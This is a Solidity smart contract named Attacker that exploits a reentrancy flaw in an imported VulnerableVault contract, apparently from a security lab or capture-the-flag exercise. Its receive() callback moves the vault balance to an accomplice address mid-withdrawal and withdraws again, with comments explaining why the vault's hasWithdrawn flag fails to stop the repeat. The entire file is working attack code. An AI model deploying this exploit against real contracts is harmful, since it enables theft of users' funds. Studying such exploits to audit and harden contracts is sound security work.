// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;
    address public accomplice;
    uint256 public attackStep;

    constructor(address _vault, address _accomplice) {
        vault = VulnerableVault(_vault);
        accomplice = _accomplice;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (attackStep == 0) {
            attackStep = 1;
            // During withdraw callback, transfer balance to accomplice
            // This resets our balance but NOT hasWithdrawn flag
            vault.transfer(accomplice, 1 ether);
            
            // Now withdraw again - hasWithdrawn is still false!
            vault.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
